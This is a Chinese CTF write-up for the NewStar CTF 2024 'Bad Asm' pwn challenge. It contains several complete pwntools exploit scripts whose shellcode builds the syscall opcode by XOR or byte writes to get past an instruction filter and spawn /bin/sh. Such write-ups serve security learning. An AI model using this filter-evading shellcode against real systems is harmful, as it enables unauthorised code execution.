---
titleTemplate: ':title | WriteUp - NewStar CTF 2024'
---

# Bad Asm

程序过滤 `syscall` / `sysenter` / `int 0x80` 的汇编指令的机器码。

`strcpy` 限制了 shellcode 的机器码中不能出现 `0x00`.

开启的可执行的段具有写的权限，用异或搓出来 syscall 的机器码之后用 `mov` 写入到 shellcode 后面，中间用 `nop` 连接一下就行了。

由于程序清空了 `rsp` `rbp` 寄存器，我们需要恢复一下 `rsp` 的值，任意一个可读写的段即可，否则 `push` 操作会寄掉。

可以用异或先把 syscall 的机器码插入到当前 shellcode 的后面来执行 `read` 的 syscall，利用 `read` 在旧的 shellcode 后面插入 `execve("/bin/sh", 0, 0)` 的 shellcode，第二次输入的 payload 中 `0x42` 个 `a` 的作用是覆盖掉旧的 shellcode，毕竟执行过了也没用了。

恢复 `rsp` 的作用是为了能够正常执行 `push` `pop` 指令，这里 `push` `pop` 指令位于 `shellcraft.sh()` 生成的 shellcode 中 。否则其生成的 shellcode 无法正常执行。

```python
# sudo sysctl -w kernel.randomize_va_space=0
from pwn import *
from Crypto.Util.number import long_to_bytes, bytes_to_long

context.log_level='debug'
context(arch='amd64', os='linux')
context.terminal=['tmux', 'splitw', '-h']

ELFpath = './pwn'
p=remote('???.???.???.???', ?????)

# p=process(ELFpath)
# gdb.attach(p)

shellcode='''
; // 目标: 使用 syscall 执行 read(0, code, 0x3fff)
mov rsp, rdi
mov rax, rdi
add sp, 0x0848 ; // 从开头到这里的作用是给 rsp 一个合法值，使 push/pop 指令能够正常执行。同时设置 rax 的值方便后面往当前 shellcode 末尾拼接上 syscall 指令的机器码。

mov rsi,rdi
mov dx, 0x3fff ; // 这两行作用是设置 rsi rdx 寄存器

mov cx, 0x454f
xor cx, 0x4040 ; // 这两行作用是用异或搓出来 0f 05 (syscall 的机器码)
add al, 0x40
mov [rax], cx  ; // rax原本指向的是当前段的开始位置，加上一个偏移，在之后指向的地方写入 0f 05，即 syscall，相当于拼接到当前 shellcode 后面。

xor rdi, rdi
xor rax, rax   ; // 设置 read 的系统调用号 0，设置 rdi 寄存器
'''
p.sendafter("Input your Code :", asm(shellcode).ljust(0x40, b'\x90')) # \x90是nop指令的机器码，用于连接上面的shellcode和写入的syscall，使程序能正常执行。

pause()
p.send(b'a'*0x42+asm(shellcraft.sh())) # 0x42个a正好覆盖了syscall，之后拼接新的shellcode会继续执行本次写入的新的shellcode
p.interactive()
```

除了异或的方法，我们可以用另一种方法布置 syscall 的机器码。

题目检查 syscall 的时候采用的方法是检测相邻两个字节，所以我们可以将两个字节分别用一个汇编指令写入到内存中，比如用 `mov`，这样我们就可以将其机器码 `0xf 0x5` 拆开，而不是连续的字节，这样也可以通过检查。

```python
mov byte ptr [r8 + 0x17], 0xf
mov byte ptr [r8 + 0x18], 0x5
```

最后保证控制执行流执行到写入的 `0f05` 那里就行了。

下面的 EXP 中直接异或搓了一个 `execve("/bin/sh", 0, 0)`，这样也是可以的。

```python
# sudo sysctl -w kernel.randomize_va_space=0
from pwn import *
from Crypto.Util.number import long_to_bytes, bytes_to_long

context.log_level='debug'
context(arch='amd64', os='linux')
context.terminal=['tmux', 'splitw', '-h']

ELFpath = './pwn'
p=remote('???.???.???.???', ?????)

# p=process(ELFpath)
# gdb.attach(p)

shellcode='''
; // 目标: 执行 execve("/bin/sh", 0, 0) 的 syscall
mov rsp, rdi
add sp, 0x0848 ; // 给 rsp 一个合法值，使程序能正常执行 push/pop，任意一个可读写段即可，我们这里刚好有rdi中存储的 shellcode 的段的起始位置，正好这个段有读写权限，就直接拿来在 0x848 偏移的位置当作栈顶了（加偏移是为了防止某些操作破坏写入的 shellcode）
mov rsi, 0x4028636f2e49226f
mov rdx, 0x4040104040204040
xor rsi, rdx
push rsi       ; // 异或搓出来'/bin/sh\x00'(正好 8 字节，一个寄存器能存下) 并 push 到栈上面。此时 rsp 指向的即此字符串的开始位置

mov ax, 0x454f
xor ax, 0x4040
mov rsi, rdi
add sil, 0x40
mov [rsi], ax  ; // 搓出来 syscall 的机器码 0f 05 并且拼接到当前 shellcode 后面。

mov rdi, rsp   ; // 设置 rdi，指向之前 push 到栈上面的 '/bin/sh\x00'
xor rsi, rsi
xor rdx, rdx   ; // 设置 rsi, rdx
xor rax, rax
mov al, 59     ; // 设置 execve 的系统调用号
'''
p.sendafter("Input your Code :", asm(shellcode).ljust(0x40, b'\x90'))
p.interactive()
```

除此之外，由于我们把栈放在可执行段上面了，我们可以直接异或整出来 syscall 的机器码然后 push 到栈上面，最后 `jmp rsp` 即可。由于这种方法我们并不依赖 `nop` 指令进行连接，在送 Payload 的时候可以去掉 `ljust` 了。

```python
# sudo sysctl -w kernel.randomize_va_space=0
from pwn import *
from Crypto.Util.number import long_to_bytes, bytes_to_long

context.log_level='debug'
context(arch='amd64', os='linux')
context.terminal=['tmux', 'splitw', '-h']

ELFpath = './pwn'
p=remote('???.???.???.???', ?????)

# p=process(ELFpath)
# gdb.attach(p)

shellcode='''
; // 目标: 执行 execve("/bin/sh", 0, 0) 的 syscall
mov rsp, rdi
add sp, 0x0848 ; // 给 rsp 一个合法值，使程序能正常执行 push/pop
mov rsi, 0x4028636f2e49226f
mov rdx, 0x4040104040204040
xor rsi, rdx
push rsi       ; // 异或搓出来 '/bin/sh\x00' 并 push 到栈上面。此时 rsp 指向的即此字符串的开始位置

mov rdi, rsp   ; // 设置 rdi，指向之前push到栈上面的 '/bin/sh\x00'
xor rsi, rsi
xor rdx, rdx   ; // 设置 rsi, rdx
xor rax, rax
mov al, 59     ; //设置 execve 的系统调用号

mov cx, 0xf5ff
xor cx, 0xf0f0 ; // 异或拿到 syscall 的机器码
push rcx       ; // push 到栈顶，rsp 此时指向的是 syscall 指令
jmp rsp
'''

p.sendafter("Input your Code :", asm(shellcode))

p.interactive()
```

在把 `/bin/sh\x00` push 到栈上面的时候，我们为了清除最后的 `0x00`，采用了异或的方法。除了这种方法外我们可以调整一下这个字符串，比如我们可以改为使用 `/bin///sh`，`shellcraft.sh()` 生成的 shellcode 采用的就是这种方法。

按照这种方法更改的 shellcode，也是可以拿到 shell 的。

```python
shellcode='''
; // 目标: 执行 execve("/bin///sh", 0, 0) 的 syscall
mov rsp, rdi
add sp, 0x0848 ; // 给rsp一个合法值，使程序能正常执行push/pop

push 0x68
mov rax, 0x732f2f2f6e69622f
push rax       ; // 将 '/bin///sh' push 到栈上面，最后一个字符 h 是第 6 行 push 的，高位默认填充为 0，此时就不用异或了

mov rdi, rsp   ; // 设置 rdi，指向之前 push 到栈上面的 '/bin/sh\x00'
xor rsi, rsi
xor rdx, rdx   ; // 设置 rsi, rdx
xor rax, rax
mov al, 59     ; // 设置 execve 的系统调用号

mov cx, 0xf5ff
xor cx, 0xf0f0 ; // 异或拿到 syscall 的机器码
push rcx       ; // push 到栈顶，rsp 此时指向的是 syscall 指令
jmp rsp
'''
```
